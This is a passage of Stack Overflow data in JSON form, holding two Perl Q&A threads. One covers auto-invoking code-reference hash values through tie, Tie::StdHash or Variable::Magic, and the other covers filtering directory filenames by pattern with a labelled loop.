"https://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references/37061862#37061862", "title": "Automatically call hash values that are subroutine references", "body": "<p><a href=\"https://stackoverflow.com/a/37061673\">As noted by Oleg</a>, it's possible to do this using various more or less arcane tricks like <code>tie</code>, overloading or magic variables.  However, this would be both needlessly complicated and pointlessly obfuscated.  As cool as such tricks are, using them in real code would be a mistake at least 99% of the time.</p>\n\n<p>In practice, the simplest and cleanest solution is probably to write a helper subroutine that takes a scalar and, if it's a code reference, executes it and returns the result:</p>\n\n<pre><code>sub evaluate {\n    my $val = shift;\n    return $val-&gt;() if ref($val) eq 'CODE';\n    return $val;  # otherwise\n}\n</code></pre>\n\n<p>and <a href=\"http://ideone.com/sDM64D\" rel=\"nofollow noreferrer\">use it like this</a>:</p>\n\n<pre><code>foreach my $key (sort keys %hash) {\n    print evaluate($hash{$key}) . \"\\n\";\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462528779, "post_id": 37067402, "comment_id": 61684119, "body": "Take a look at <a href=\"https://metacpan.org/pod/Tie::Hash\" rel=\"nofollow noreferrer\"><code>Tie::Hash</code></a> and similar modules. There&#39;s a lot of library support, and generally no need to rewrite all of the access methods unless you want to change them. Take a look at my own solution"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 2, "last_activity_date": 1462522189, "creation_date": 1462522189, "answer_id": 37067402, "question_id": 37061561, "link": "https://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references/37067402#37067402", "title": "Automatically call hash values that are subroutine references", "body": "<p>One of perl's special features for just such a use case is <code>tie</code>. This allows you to attach object oriented style methods, to a scalar or hash. </p>\n\n<p>It should be used with caution, because it <em>can</em> mean that your code is doing really strange things, in unexpected ways. </p>\n\n<p>But as an example: </p>\n\n<pre><code>#!/usr/bin/env perl\n\npackage RandomScalar;\n\nmy $random_range = 10;\n\nsub TIESCALAR {\n    my ( $class, $range ) = @_;\n    my $value = 0;\n    bless \\$value, $class;\n}\n\nsub FETCH {\n    my ($self) = @_;\n    return rand($random_range);\n}\n\nsub STORE {\n    my ( $self, $range ) = @_;\n    $random_range = $range;\n}\n\npackage main;\n\nuse strict;\nuse warnings;\n\ntie my $random_var, 'RandomScalar', 5;\n\nfor ( 1 .. 10 ) {\n    print $random_var, \"\\n\";\n}\n\n$random_var = 100;\nfor ( 1 .. 10 ) {\n    print $random_var, \"\\n\";\n}\n</code></pre>\n\n<p>As you can see - this lets you take an 'ordinary' scalar, and do fruity things with it. You can use a very similar mechanism with a <code>hash</code> - an example might be to do database lookups.</p>\n\n<p>However, you <em>also</em> need to be quite cautious - because you're creating action at a distance by doing so. Future maintenance programmers might well not expect your <code>$random_var</code> to actually change each time you run it, and a value assignment to not actually 'set'. </p>\n\n<p>It can be really useful for e.g. testing though, which is why I give an example.</p>\n\n<p>In your example - you could potentially 'tie' the hash:</p>\n\n<pre><code>#!/usr/bin/env perl\n\npackage MagicHash;\n\nsub TIEHASH {\n    my ($class) = @_;\n    my $self = {};\n    return bless $self, $class;\n}\n\nsub FETCH {\n    my ( $self, $key ) = @_;\n    if ( ref( $self-&gt;{$key} ) eq 'CODE' ) {\n        return $self-&gt;{$key}-&gt;();\n    }\n    else {\n        return $self-&gt;{$key};\n    }\n}\n\nsub STORE {\n    my ( $self, $key, $value ) = @_;\n    $self-&gt;{$key} = $value;\n}\n\nsub CLEAR {\n    my ($self) = @_;\n    $self = {};\n}\n\nsub FIRSTKEY {\n    my ($self) = @_;\n    my $null = keys %$self;    #reset iterator\n    return each %$self;\n}\n\nsub NEXTKEY {\n    my ($self) = @_;\n    return each %$self;\n}\n\npackage main;\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\ntie my %magic_hash, 'MagicHash';\n%magic_hash = (\n    key1 =&gt; 2,\n    key2 =&gt; sub { return \"beefcake\" },\n);\n\n$magic_hash{random} = sub { return rand 10 };\n\nforeach my $key ( keys %magic_hash ) {\n    print \"$key =&gt; $magic_hash{$key}\\n\";\n}\nforeach my $key ( keys %magic_hash ) {\n    print \"$key =&gt; $magic_hash{$key}\\n\";\n}\nforeach my $key ( keys %magic_hash ) {\n    print \"$key =&gt; $magic_hash{$key}\\n\";\n}\n</code></pre>\n\n<p>This is slightly less evil, because future maintenance programmers can use your 'hash' normally. But dynamic eval can shoot the unwary in the foot, so still - caution is advised.</p>\n\n<p>And alternative is to do it 'proper' object oriented - create a 'storage object' that's ... basically like the above - only it creates an object, rather than using <code>tie</code>. This should be much clearer for long term usage, because you won't get unexpected behaviour. (It's an object doing magic, which is normal, not a hash that 'works funny'). </p>\n"}, {"comments": [{"owner": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462543135, "post_id": 37068697, "comment_id": 61693152, "body": "This is basically exactly what I was looking for!"}, {"owner": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462546399, "post_id": 37068697, "comment_id": 61695483, "body": "Okay\u2026 next question. How do I do this when it&#39;s not actually a hash, but a hashref that I initialize?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462547893, "post_id": 37068697, "comment_id": 61696441, "body": "@iLikeDirt, No change. Just tie the referenced hash as before."}, {"owner": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462549748, "post_id": 37068697, "comment_id": 61697708, "body": "Basically, is there any way to initialize an anonymous SpecialHash ref? In production, what I have is a two-dimensional data structure that&#39;s an anonymous hashref of anonymous hashrefs, and I&#39;d like them all to be SpecialHashes."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462554110, "post_id": 37068697, "comment_id": 61700303, "body": "@iLikeDirt, You could tie each second-level hash using <code>tie %$_, SpecialHash::, %$_ for values(%$HoH);</code>. More flexible solutions are far more complicated."}, {"owner": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462559415, "post_id": 37068697, "comment_id": 61703105, "body": "Correct, only the second-level hashes (actually they&#39;re anonymous hashrefs) may have code in them."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462635366, "post_id": 37068697, "comment_id": 61724520, "body": "@iLikeDirt: I&#39;ve added to my answer to explain how to tie existing hashes. It works fine as it stands, but remember that it&#39;s much better to tie each secondary hash <i>before</i> you put data into it and add it to your outer hash, but I realise that may not be possible"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 4, "last_activity_date": 1467563004, "last_edit_date": 1467563004, "creation_date": 1462526427, "answer_id": 37068697, "question_id": 37061561, "link": "https://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references/37068697#37068697", "title": "Automatically call hash values that are subroutine references", "body": "<p>I don't believe that the words that others have written in disapproval of the <a href=\"http://perldoc.perl.org/perltie.html\" rel=\"nofollow\"><code>tie</code> mechanism</a> are warranted. None of the authors seem to properly understand how it works and what core library backup is available</p>\n\n<p>Here's a <code>tie</code> example based on <a href=\"https://metacpan.org/pod/Tie::Hash#Inheriting-from-Tie::StdHash\" rel=\"nofollow\"><code>Tie::StdHash</code></a></p>\n\n<p>If you tie a hash to the <code>Tie::StdHash</code> class then it works exactly as a normal hash. That means there's nothing left to write except for methods that you may want to override</p>\n\n<p>In this case I've overridden <code>TIEHASH</code> so that I could specify the initialisation list in the same statement as the <code>tie</code> command, and <code>FETCH</code>, which calls the superclass's FETCH and then makes a call to it if it happens to be a subroutine reference</p>\n\n<p>Your tied hash will work as normal except for the change that you have asked for. I hope it is obvious that there is no longer a direct way to retrieve a subroutine reference if you have stored it as a hash value. Such a value will always be replaced by the result of calling it without any parameters</p>\n\n<h3>SpecialHash.pm</h3>\n\n<pre><code>package SpecialHash;\n\nuse Tie::Hash;\nuse base 'Tie::StdHash';\n\nsub TIEHASH {\n    my $class = shift;\n    bless { @_ }, $class;\n}\n\nsub FETCH {\n    my $self = shift;\n    my $val = $self-&gt;SUPER::FETCH(@_);\n    ref $val eq 'CODE' ? $val-&gt;() : $val;\n}\n\n1;\n</code></pre>\n\n<h3>main.pl</h3>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse SpecialHash;\n\ntie my %hash, SpecialHash =&gt; (\n    key1 =&gt; \"value1\",\n    key2 =&gt; sub {\n        return \"value2\"; # In the real code, this value can differ\n    },\n);\n\nprint \"$hash{$_}\\n\" for sort keys %hash;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>value1\nvalue2\n</code></pre>\n\n<p><br/></p>\n\n<hr>\n\n<h3>Update</h3>\n\n<p>It sounds like your real situation is with an existing hash that looks something like this</p>\n\n<pre><code>my %hash = (\n    a =&gt; {\n        key_a1 =&gt; 'value_a1',\n        key_a2 =&gt; sub { 'value_a2' },\n    },\n    b =&gt; {\n        key_b1 =&gt; sub { 'value_b1' },\n        key_b2 =&gt; 'value_b2',\n    },\n);\n</code></pre>\n\n<p>Using <code>tie</code> on already-populated variables isn't so neat as tying then at the point of declaration and then inserting the values as the data must be copied to the tied object. However the way I have written the <code>TIEHASH</code> method in the <code>SpecialHash</code> class makes this simple to do in the <code>tie</code> statement</p>\n\n<p><strong><em>If possible</em></strong>, it would be much better to <code>tie</code> each hash before you put data into it and add it to the primary hash</p>\n\n<p>This program ties every value of <code>%hash</code> that happens to be a hash reference. The core of this is the statement</p>\n\n<pre><code>tie %$val, SpecialHash =&gt; ( %$val )\n</code></pre>\n\n<p>which functions identically to</p>\n\n<pre><code>tie my %hash, SpecialHash =&gt; ( ... )\n</code></pre>\n\n<p>in the previous code but dereferences <code>$val</code> to make the syntax valid, and also uses the current contents of the hash as the initialisation data for the tied hash. That is how the data gets copied</p>\n\n<p>After that there is just a couple of nested loops that dump the whole of <code>%hash</code> to verify that the ties are working</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse SpecialHash;\n\nmy %hash = (\n    a =&gt; {\n        key_a1 =&gt; 'value_a1',\n        key_a2 =&gt; sub { 'value_a2' },\n    },\n    b =&gt; {\n        key_b1 =&gt; sub { 'value_b1' },\n        key_b2 =&gt; 'value_b2',\n    },\n);\n\n# Tie all the secondary hashes that are hash references\n#\nfor my $val ( values %hash ) {\n    tie %$val, SpecialHash =&gt; ( %$val ) if ref $val eq 'HASH';\n}\n\n# Dump all the elements of the second-level hashes\n#\nfor my $k ( sort keys %hash ) {\n\n    my $v = $hash{$k};\n    next unless ref $v eq 'HASH';\n\n    print \"$k =&gt;\\n\";\n\n    for my $kk ( sort keys %$v ) {\n        my $vv = $v-&gt;{$kk};\n        print \"    $kk =&gt; $v-&gt;{$kk}\\n\" \n    }\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>a =&gt;\n    key_a1 =&gt; value_a1\n    key_a2 =&gt; value_a2\nb =&gt;\n    key_b1 =&gt; value_b1\n    key_b2 =&gt; value_b2\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462552264, "post_id": 37076283, "comment_id": 61699215, "body": "Ah, this actually looks perfect, assuming I can figure out how to implement it\u2026"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 1, "creation_date": 1462554013, "post_id": 37076283, "comment_id": 61700244, "body": "Updated answer to show how to &quot;fix up&quot; your hash-of-hashes."}, {"owner": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "edited": false, "score": 0, "creation_date": 1462649676, "post_id": 37076283, "comment_id": 61729364, "body": "This is what I ended up doing and it worked magnificently. Thanks very much!"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1462553986, "last_edit_date": 1462553986, "creation_date": 1462548888, "answer_id": 37076283, "question_id": 37061561, "link": "https://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references/37076283#37076283", "title": "Automatically call hash values that are subroutine references", "body": "<p>There's a feature called \"magic\" that allows code to be called when variables are accessed.</p>\n\n<p>Adding magic to a variable greatly slows down access to that variable, but some are more expensive than others.</p>\n\n<ul>\n<li>There's no need to make access to every element of the hash magical, just some values.</li>\n<li><code>tie</code> is an more expensive form of magic, and it's not needed here.</li>\n</ul>\n\n<p>As such, the most efficient solution is the following:</p>\n\n<pre><code>use Time::HiRes     qw( time );\nuse Variable::Magic qw( cast wizard );\n\n{\n   my $wiz = wizard(\n      data =&gt; sub { my $code = $_[1]; $code },\n      get =&gt; sub { ${ $_[0] } = $_[1]-&gt;(); },\n   );\n\n   sub make_evaluator { cast($_[0], $wiz, $_[1]) }\n}\n\nmy %hash;\n$hash{key1} = 'value1';\nmake_evaluator($hash{key2}, sub { 'value2@'.time });\n\nprint(\"$hash{$_}\\n\") for qw( key1 key2 key2 );\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>value1\nvalue2@1462548850.76715\nvalue2@1462548850.76721\n</code></pre>\n\n<hr>\n\n<p>Other examples:</p>\n\n<pre><code>my %hash; make_evaluator($hash{key}, sub { ... });\nmy $hash; make_evaluator($hash-&gt;{$key}, sub { ... });\n\nmy $x; make_evaluator($x, sub { ... });\nmake_evaluator(my $x, sub { ... });\n\nmake_evaluator(..., sub { ... });\nmake_evaluator(..., \\&amp;some_sub);\n</code></pre>\n\n<p>You can also \"fix up\" an existing hash. In your hash-of-hashes scenario,</p>\n\n<pre><code>my $hoh = {\n   { \n      key1 =&gt; 'value1',\n      key2 =&gt; sub { ... },\n      ...\n   },\n   ...\n);\n\nfor my $h (values(%$hoh)) {\n   for my $v (values(%$h)) {\n      if (ref($v) eq 'CODE') {\n         make_evaluator($v, $v);\n      }\n   }\n}\n</code></pre>\n"}], "owner": {"reputation": 536, "user_id": 2934226, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/69e90368878ffd6e11fc73ebe1804787?s=128&d=identicon&r=PG&f=1", "display_name": "iLikeDirt", "link": "https://stackoverflow.com/users/2934226/ilikedirt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 623, "favorite_count": 2, "accepted_answer_id": 37076283, "answer_count": 7, "score": 4, "last_activity_date": 1467563004, "creation_date": 1462488701, "last_edit_date": 1462530329, "question_id": 37061561, "link": "https://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references", "title": "Automatically call hash values that are subroutine references", "body": "<p>I have a hash with a few values that are not scalar data but rather anonymous subroutines that return scalar data. I want to make this completely transparent to the part of the code that looks up values in the hash, so that it doesn't have to be aware that some of the hash values may be anonymous subroutines that return scalar data rather than just plain old scalar data.</p>\n\n<p>To that effect, is there any way to have the anonymous subroutines executed when their keys are accessed, without using any special syntax? Here's a simplified example that illustrates the goal and the problem:</p>\n\n<pre><code>#!/usr/bin/perl\n\nmy %hash = (\n    key1 =&gt; \"value1\",\n    key2 =&gt; sub {\n        return \"value2\"; # In the real code, this value can differ\n    },\n);\n\nforeach my $key (sort keys %hash) {\n    print $hash{$key} . \"\\n\";\n}\n</code></pre>\n\n<p>The output I would like is:</p>\n\n<pre><code>perl ./test.pl\nvalue1\nvalue2\n</code></pre>\n\n<p>Instead, this is what I get:</p>\n\n<pre><code>perl ./test.pl\nvalue1\nCODE(0x7fb30282cfe0)\n</code></pre>\n"}, {"tags": ["arrays", "perl", "file", "subroutine"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1462484583, "post_id": 37060717, "comment_id": 61668488, "body": "Why do you have <code>@ARGV</code> there? It carries <i>command line arguments</i>.  Change <code>@ARGV</code> to <code>@patterns</code> and it should work.  I&#39;d also suggest that you return a reference to <code>@return</code> since that can turn out to be a long list.  Also, I don&#39;t get your <code>last</code> -- it breaks out of the loop over patterns after the first match (successful <code>if</code>), so you effectively test only for the first pattern in <code>@patterns</code>."}, {"owner": {"reputation": 51391, "user_id": 132382, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/20fc7ee8f405aa42e36eb73e841e5a36?s=128&d=identicon&r=PG", "display_name": "pilcrow", "link": "https://stackoverflow.com/users/132382/pilcrow"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1462485244, "post_id": 37060717, "comment_id": 61668775, "body": "@zdim I&#39;d thought so, too, at first glance, but the <code>last</code> breaks the inner loop, preventing a filename from matching more that one pattern.  Quite so re: <code>@ARGV</code>"}, {"owner": {"reputation": 697, "user_id": 5449244, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/131ad184c67440a0a499852f247b4ea6?s=128&d=identicon&r=PG&f=1", "display_name": "onlyf", "link": "https://stackoverflow.com/users/5449244/onlyf"}, "edited": false, "score": 0, "creation_date": 1462486564, "post_id": 37060717, "comment_id": 61669282, "body": "Is there a way to incorporate the above script into one that does this recursively for all subdirectories? I basicly want to emulate the shell ls -lR | grep patterns."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 51391, "user_id": 132382, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/20fc7ee8f405aa42e36eb73e841e5a36?s=128&d=identicon&r=PG", "display_name": "pilcrow", "link": "https://stackoverflow.com/users/132382/pilcrow"}, "edited": false, "score": 0, "creation_date": 1462486569, "post_id": 37060717, "comment_id": 61669286, "body": "@pilcrow  Um, correct -- thank you.  Supply a list <code>@patterns</code> to try but once the current file matches a pattern that&#39;s it, move onto the next file. I do get it now."}], "answers": [{"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462486917, "post_id": 37061193, "comment_id": 61669423, "body": "Your comment is incorrect.  What you say does exactly the same as posted code.  It may be nicer or better but it is not a &quot;<i>fix</i>&quot;. What fixes the problem is the change to <code>@patterns</code> from the OP&quot;s <code>@ARGV</code>."}, {"owner": {"reputation": 160, "user_id": 119707, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2d26107fa79aee77647ff90e65dbb91?s=128&d=identicon&r=PG", "display_name": "Omid", "link": "https://stackoverflow.com/users/119707/omid"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462487005, "post_id": 37061193, "comment_id": 61669456, "body": "Well, for some strange reason I don&#39;t see any @ARGV ! Also this is a quick fix not the best."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462487147, "post_id": 37061193, "comment_id": 61669509, "body": "Whoa ... in the original post there was <code>for my $pattern (@ARGV)</code>.  This is a fine change but I don&#39;t see how it affects processing at all, that&#39;s what I was saying.  Both ways exit the inner loop and continue iterating through the outter loop once <code>if</code> evaluates true in the inner loop."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462515135, "post_id": 37061193, "comment_id": 61676832, "body": "Right -- and it is.  I think that the only error was that <code>@ARGV</code>, which then got fixed. (Possibly after comments popped up.)"}], "tags": [], "owner": {"reputation": 160, "user_id": 119707, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2d26107fa79aee77647ff90e65dbb91?s=128&d=identicon&r=PG", "display_name": "Omid", "link": "https://stackoverflow.com/users/119707/omid"}, "is_accepted": true, "score": 2, "last_activity_date": 1462486603, "creation_date": 1462486603, "answer_id": 37061193, "question_id": 37060717, "link": "https://stackoverflow.com/questions/37060717/perl-scan-directory-for-pattern-in-contained-filenames-and-fill-array/37061193#37061193", "title": "Perl - Scan directory for pattern in contained filenames and fill array", "body": "<p>The quick fix could be add a label for your first loop and then change the \"last\" to \"next FILE\":</p>\n\n<pre><code>my $dir = \"/drives/D/Desktop/perlscripts\";\n\nsub getfiles\n{\n  my ($dirName, @patterns) = @_;\n  opendir(my $dir, $dirName) or die \"Can't open '$dirName': $!\";\n  my @return;\n  FILE:\n  for my $file (readdir($dir))\n  {\n    for my $pattern (@patterns)\n    {\n      if ($file =~ /$pattern/)\n      { \n        print \"$file \\n\";\n        push @return, $file;\n        # This avoids having the file in the result twice\n        # last\n        next FILE;\n      }\n    }\n   }\n\n    return @return;\n  }\n\n\n my @plscripts = getfiles($dir, \"pl\");\n print \"@plscripts \\n\";\n</code></pre>\n"}], "owner": {"reputation": 697, "user_id": 5449244, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/131ad184c67440a0a499852f247b4ea6?s=128&d=identicon&r=PG&f=1", "display_name": "onlyf", "link": "https://stackoverflow.com/users/5449244/onlyf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 1, "accepted_answer_id": 37061193, "answer_count": 1, "score": 1, "last_activity_date": 1462486603, "creation_date": 1462484305, "last_edit_date": 1462485478, "question_id": 37060717, "link": "https://stackoverflow.com/questions/37060717/perl-scan-directory-for-pattern-in-contained-filenames-and-fill-array", "title": "Perl - Scan directory for pattern in contained filenames and fill array", "body": "<p>i ve tried to write a simple function that takes two arguments, input directory and pattern, and returns an array with the matched files that contain the pattern(s) in their name.</p>\n\n<pre><code>my $dir = \"/drives/D/Desktop/perlscripts\";\n\nsub getfiles\n{\n  my ($dirName, @patterns) = @_;\n  opendir(my $dir, $dirName) or die \"Can't open '$dirName': $!\";\n  my @return;\n  for my $file (readdir($dir))\n  {\n    for my $pattern (@patterns)\n    {\n      if ($file =~ /$pattern/)\n      { \n        print \"$file \\n\";\n        push @return, $file;\n        # This avoids having the file in the result twice\n        last;\n      }\n    }\n   }\n\n    return @return;\n  }\n\n\n my @plscripts = getfiles($dir, \"pl\");\n print \"@plscripts \\n\";\n</code></pre>\n\n<p>I get nothing in STDOUT with the code as is, after some tests, i think the problem is with the. </p>\n\n<p>Edited with changes : As you can see i commented out #last; but yes it matches every file name on every iteration then. So i end up with duplicate entries in the array.</p>\n"}]